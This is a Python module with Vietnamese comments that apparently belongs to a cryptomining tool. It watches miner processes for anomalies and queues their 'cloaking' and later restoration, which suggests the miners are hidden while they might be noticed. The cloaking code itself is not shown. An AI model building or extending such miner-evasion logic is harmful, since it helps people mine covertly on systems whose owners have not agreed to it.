"""
Module anomaly_detector.py - Quản lý và phát hiện bất thường (anomaly detection) cho tiến trình khai thác.
Đã refactor sang mô hình đồng bộ (threading), loại bỏ hoàn toàn asyncio/await,
duy trì logic tương thích với resource_manager.py.
Giờ đây module cũng triển khai process_states (normal, cloaking, cloaked, restoring) cho từng PID.
"""

import psutil
import logging
import traceback
import pynvml
import threading
import time

from typing import List, Dict, Any
from .utils import MiningProcess
from .anomaly_evaluator import SafeRestoreEvaluator

from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules.interfaces import IResourceManager

###############################################################################
#                    CÁC BIẾN TOÀN CỤC QUẢN LÝ NVML (Đồng bộ)                #
###############################################################################
_nvml_lock = threading.RLock()
_nvml_initialized = False


def initialize_nvml_sync(logger: logging.Logger):
    """
    Khởi tạo NVML (đồng bộ) nếu chưa init, dùng lock toàn cục.
    
    :param logger: Logger để ghi nhận thông tin và lỗi.
    """
    global _nvml_initialized
    with _nvml_lock:
        if not _nvml_initialized:
            try:
                pynvml.nvmlInit()
                _nvml_initialized = True
                logger.info("NVML đã được khởi tạo (một lần).")
            except pynvml.NVMLError as e:
                raise RuntimeError(f"Lỗi khi khởi tạo NVML: {e}") from e


def is_nvml_initialized() -> bool:
    """
    Trả về True nếu NVML đã được khởi tạo, ngược lại False.
    """
    return _nvml_initialized


###############################################################################
#                           LỚP CHÍNH: AnomalyDetector                        #
###############################################################################
class AnomalyDetector:
    """
    Lớp phát hiện bất thường cho tiến trình khai thác, theo mô hình đồng bộ.
    Quản lý 2 thread chính:
      1) anomaly_detection_thread: Liên tục kiểm tra anomaly dựa vào metrics
      2) restoration_monitor_thread: Giám sát điều kiện khôi phục (safe_restore)

    Thu thập metrics, đánh giá anomaly => enqueue cloaking. 
    Kiểm tra điều kiện restore => enqueue restore.

    Triển khai process_states (normal, cloaking, cloaked, restoring) cho mỗi PID
    để tránh enqueue cloaking trùng lặp hoặc xung đột trong khâu phục hồi.
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus,
                logger: logging.Logger, resource_manager: IResourceManager):
        """
        Triển khai Singleton pattern (đảm bảo chỉ có 1 AnomalyDetector).
        """
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus,
                 logger: logging.Logger, resource_manager: IResourceManager):
        """
        Khởi tạo AnomalyDetector.

        :param config: Cấu hình cho AnomalyDetector (ConfigModel).
        :param event_bus: Hệ thống pub/sub (EventBus).
        :param logger: Logger để ghi log.
        :param resource_manager: Tham chiếu tới ResourceManager (đồng bộ).
        """
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.config = config
        self.event_bus = event_bus
        self.logger = logger
        self.resource_manager = resource_manager

        # Biến cờ để dừng các thread
        self._stop_flag = False

        # Lock đồng bộ bảo vệ self.mining_processes
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # Bản đồ PID -> trạng thái: "normal", "cloaking", "cloaked", "restoring"
        self.process_states: Dict[int, str] = {}

        # SafeRestoreEvaluator (nếu có logic safe restore)
        self.safe_restore_evaluator = SafeRestoreEvaluator(config, logger, resource_manager)

        # Lưu history metrics => { pid_str: [ sample_dict1, sample_dict2, ... ] }
        self.metrics_history: Dict[str, List[Dict[str, float]]] = {}
        # Tối thiểu data points để kiểm tra anomaly
        self.min_data_points = 12

        # Danh sách thread => anomaly detection + restoration monitor
        self.threads: List[threading.Thread] = []

        self.logger.info("AnomalyDetector đã được khởi tạo thành công.")

    ##########################################################################
    #                    HÀM KHỞI ĐỘNG VÀ DỪNG MODULE                        #
    ##########################################################################
    def start(self):
        """
        Khởi động AnomalyDetector:
        - Khởi tạo NVML (đồng bộ) nếu chưa init.
        - (Tuỳ chọn) khởi động safe_restore_evaluator nếu cần.
        - Tạo thread anomaly_detection và thread monitor_restoration.
        - Gọi discover_mining_processes ban đầu.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")

        # Đảm bảo resource_manager tồn tại
        if not self.resource_manager:
            raise RuntimeError("ResourceManager chưa được thiết lập.")

        # Khởi tạo NVML nếu chưa
        if not is_nvml_initialized():
            initialize_nvml_sync(self.logger)

        # Khởi động SafeRestoreEvaluator nếu cần
        try:
            self.safe_restore_evaluator.start()
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động SafeRestoreEvaluator: {e}\n{traceback.format_exc()}")

        # Tạo thread anomaly_detection
        t_anomaly = threading.Thread(
            target=self.anomaly_detection_thread,
            daemon=True,
            name="AnomalyDetectionThread"
        )
        t_anomaly.start()
        self.threads.append(t_anomaly)

        # Tạo thread monitor_restoration
        t_restore = threading.Thread(
            target=self.monitor_restoration_thread,
            daemon=True,
            name="RestorationMonitorThread"
        )
        t_restore.start()
        self.threads.append(t_restore)

        # Gọi discover ban đầu (đồng bộ)
        self.discover_mining_processes()
        self.logger.info("AnomalyDetector đã khởi động thành công.")

    def stop(self):
        """
        Dừng AnomalyDetector: set _stop_flag=True, join các thread.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self._stop_flag = True

        # Chờ các thread dừng
        for t in self.threads:
            t.join(timeout=2)

        self.logger.info("AnomalyDetector đã dừng thành công.")

    ##########################################################################
    #                    LOGIC PHÁT HIỆN VÀ ĐÁNH GIÁ BẤT THƯỜNG              #
    ##########################################################################
    def anomaly_detection_thread(self):
        """
        Vòng lặp đồng bộ phát hiện bất thường cho các tiến trình khai thác.
        - Mỗi chu kỳ:
          + discover_mining_processes (cập nhật danh sách)
          + evaluate anomaly cho từng process (nếu state='normal')
          + sleep interval
        """
        interval = self.config.monitoring_parameters.get("detection_interval_seconds", 3600)
        while not self._stop_flag:
            try:
                # Cập nhật danh sách process
                self.discover_mining_processes()

                # Khóa, copy list => evaluate anomaly
                with self.mining_processes_lock:
                    procs_copy = list(self.mining_processes)

                # Đánh giá anomaly cho từng process
                for proc in procs_copy:
                    pid = proc.pid
                    current_state = self.process_states.get(pid, "normal")

                    # Chỉ evaluate anomaly nếu pid đang ở "normal"
                    if current_state == "normal":
                        self.evaluate_process_anomaly(proc)

            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection_thread: {e}\n{traceback.format_exc()}")

            time.sleep(interval)

    def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int = 5):
        """
        Đánh giá bất thường (anomaly) cho 1 tiến trình, dựa trên metrics thu thập.
        
        :param process: Đối tượng MiningProcess.
        :param cloak_delay: Thời gian chờ (giây) trước khi cloak, mặc định=5.
        """
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại.")
                return

            # Thu thập metrics (đồng bộ) qua resource_manager
            current_snapshot = self.collect_process_metrics(process)
            if not current_snapshot:
                self.logger.debug(f"Không thu thập được metrics PID={process.pid} => skip.")
                return

            pid_str = str(process.pid)
            # Thêm snapshot vào history
            if pid_str not in self.metrics_history:
                self.metrics_history[pid_str] = []
            self.metrics_history[pid_str].append(current_snapshot)

            # Giới hạn history => 50 sample
            if len(self.metrics_history[pid_str]) > 50:
                self.metrics_history[pid_str].pop(0)

            # Lấy min_data_points => detect anomalies
            history_data = self.metrics_history[pid_str][-self.min_data_points:]
            if len(history_data) < self.min_data_points:
                # Chưa đủ data => bỏ qua
                self.logger.debug(f"PID={process.pid} chưa đủ {self.min_data_points} data points => skip anomaly check.")
                return

            # Gọi anomaly_detector_client => anomalies
            single_proc_data = { pid_str: history_data }
            anomalies = self.detect_anomalies_via_azure(single_proc_data)

            is_anomaly = False
            # anomalies có thể là bool hoặc dict, tùy logic
            if isinstance(anomalies, bool):
                is_anomaly = anomalies
            elif isinstance(anomalies, dict):
                is_anomaly = bool(anomalies.get(pid_str, False))

            if is_anomaly:
                self.logger.warning(
                    f"Phát hiện bất thường {process.name} (PID={process.pid}), cloak sau {cloak_delay}s."
                )
                time.sleep(cloak_delay)

                pid = process.pid
                # Kiểm tra state => nếu vẫn "normal" thì chuyển sang "cloaking"
                # Rồi enqueue cloaking
                with self.mining_processes_lock:
                    state = self.process_states.get(pid, "normal")
                    if state == "normal":
                        self.process_states[pid] = "cloaking"
                        self.enqueue_cloaking(process)
                    else:
                        self.logger.debug(
                            f"PID={pid} không còn ở 'normal' => state={state}, bỏ qua cloak do anomaly."
                        )
            else:
                self.logger.info(f"Không phát hiện bất thường cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")

    def collect_process_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Gọi resource_manager thu thập metrics đồng bộ cho tiến trình.

        :param process: Đối tượng MiningProcess.
        :return: dict metrics hoặc rỗng nếu lỗi.
        """
        try:
            # Giả sử resource_manager có hàm collect_metrics (đồng bộ)
            # Hoặc ta viết 1 hàm collect_metrics_sync cho resource_manager
            metrics = self.resource_manager.collect_metrics(process)
            return metrics if metrics else {}
        except Exception as e:
            self.logger.error(f"Lỗi collect_process_metrics PID={process.pid}: {e}")
            return {}

    def detect_anomalies_via_azure(self, single_proc_data: Dict[str, List[Dict[str, float]]]) -> Any:
        """
        Gọi AzureAnomalyDetectorClient (đồng bộ) để phát hiện bất thường.

        :param single_proc_data: { 'pid_str': [ {metrics}, ... ] }
        :return: Có thể trả về bool hoặc dict, tùy logic
        """
        try:
            if not hasattr(self.resource_manager, 'azure_anomaly_detector_client'):
                self.logger.warning("azure_anomaly_detector_client không tồn tại trong resource_manager.")
                return False

            client = self.resource_manager.azure_anomaly_detector_client
            # Giả sử client có hàm detect_anomalies (đồng bộ)
            anomalies = client.detect_anomalies_sync(single_proc_data)
            return anomalies
        except AttributeError:
            self.logger.warning("Chưa có hàm đồng bộ detect_anomalies_sync => return False.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi detect_anomalies_via_azure: {e}\n{traceback.format_exc()}")
            return False

    def enqueue_cloaking(self, process: MiningProcess):
        """
        Yêu cầu cloak process, đồng bộ gọi resource_manager.enqueue_cloaking.

        :param process: Đối tượng MiningProcess.
        """
        try:
            self.resource_manager.enqueue_cloaking(process)
            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    def enqueue_restoration(self, process: MiningProcess):
        """
        Yêu cầu restore process, đồng bộ gọi resource_manager.enqueue_restoration.

        :param process: Đối tượng MiningProcess.
        """
        try:
            self.resource_manager.enqueue_restoration(process)
            self.logger.info(f"Đã enqueue restore cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                   GIÁM SÁT ĐIỀU KIỆN PHỤC HỒI TÀI NGUYÊN (ĐỒNG BỘ)     #
    ##########################################################################
    def monitor_restoration_thread(self):
        """
        Vòng lặp đồng bộ kiểm tra tiến trình nào ở trạng thái 'cloaked' => hỏi SafeRestoreEvaluator
        nếu đủ điều kiện => enqueue restore => chuyển PID => 'restoring' => sau restore => 'normal'.
        """
        interval = 60
        while not self._stop_flag:
            try:
                with self.mining_processes_lock:
                    # Lọc các tiến trình đang 'cloaked'
                    cloaked_pids = [
                        p.pid for p in self.mining_processes
                        if self.process_states.get(p.pid) == "cloaked"
                    ]

                if self.safe_restore_evaluator and cloaked_pids:
                    for pid in cloaked_pids:
                        proc_obj = self._find_mining_process(pid)
                        if not proc_obj:
                            continue

                        try:
                            # Kiểm tra an toàn để restore
                            result = self.safe_restore_evaluator.is_safe_to_restore_sync(proc_obj)
                            if result:
                                self.logger.info(f"Đủ điều kiện khôi phục PID={pid}.")
                                # Đặt state => "restoring" => enqueue restoration => xong => "normal"
                                with self.mining_processes_lock:
                                    self.process_states[pid] = "restoring"
                                self.enqueue_restoration(proc_obj)

                                # Giả sử resource_manager khi xong => PID = "normal"
                                # Hoặc ta tự set "normal" ở đây, tuỳ thiết kế:
                                with self.mining_processes_lock:
                                    if self.process_states.get(pid) == "restoring":
                                        self.process_states[pid] = "normal"
                                        self.logger.info(f"PID={pid} đã chuyển state => normal sau restore.")
                            else:
                                self.logger.debug(f"PID={pid} chưa đủ điều kiện để khôi phục.")
                        except Exception as eval_e:
                            self.logger.error(f"Lỗi khi kiểm tra khôi phục PID={pid}: {eval_e}")
            except Exception as e:
                self.logger.error(f"Lỗi monitor_restoration_thread: {e}\n{traceback.format_exc()}")

            time.sleep(interval)

    def _find_mining_process(self, pid: int) -> Any:
        """
        Tìm đối tượng MiningProcess trong self.mining_processes theo pid.
        :param pid: PID cần tìm.
        :return: MiningProcess nếu thấy, None nếu không thấy.
        """
        with self.mining_processes_lock:
            for mp in self.mining_processes:
                if mp.pid == pid:
                    return mp
        return None

    ##########################################################################
    #                           TÁC VỤ KHÁC                                   #
    ##########################################################################
    def discover_mining_processes(self):
        """
        Tìm các tiến trình khai thác (CPU, GPU) theo config, cập nhật self.mining_processes.
        Dùng lock threading để tránh race condition.
        Nếu PID mới => set state='normal'.
        """
        cpu_name = self.config.processes.get('CPU', '').lower()
        gpu_name = self.config.processes.get('GPU', '').lower()

        try:
            with self.mining_processes_lock:
                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.network_interface
                            mining_proc = MiningProcess(proc.info['pid'], proc.info['name'],
                                                        prio, net_if, self.logger)
                            pid = mining_proc.pid

                            # Nếu PID lần đầu phát hiện => state='normal'
                            if pid not in self.process_states:
                                self.process_states[pid] = "normal"

                            self.mining_processes.append(mining_proc)
                    except Exception as e:
                        self.logger.error(f"Lỗi khi xử lý tiến trình {proc.info['name']}: {e}")

                if self.mining_processes:
                    self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")
                else:
                    self.logger.warning("Không phát hiện tiến trình khai thác nào.")
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên (priority) dựa trên config.
        
        :param process_name: Tên tiến trình.
        :return: Giá trị độ ưu tiên (int).
        """
        priority_map = self.config.process_priority_map
        val = priority_map.get(process_name.lower(), 1)
        if not isinstance(val, int):
            self.logger.warning(f"Độ ưu tiên '{process_name}' không phải int => gán = 1.")
            return 1
        return val
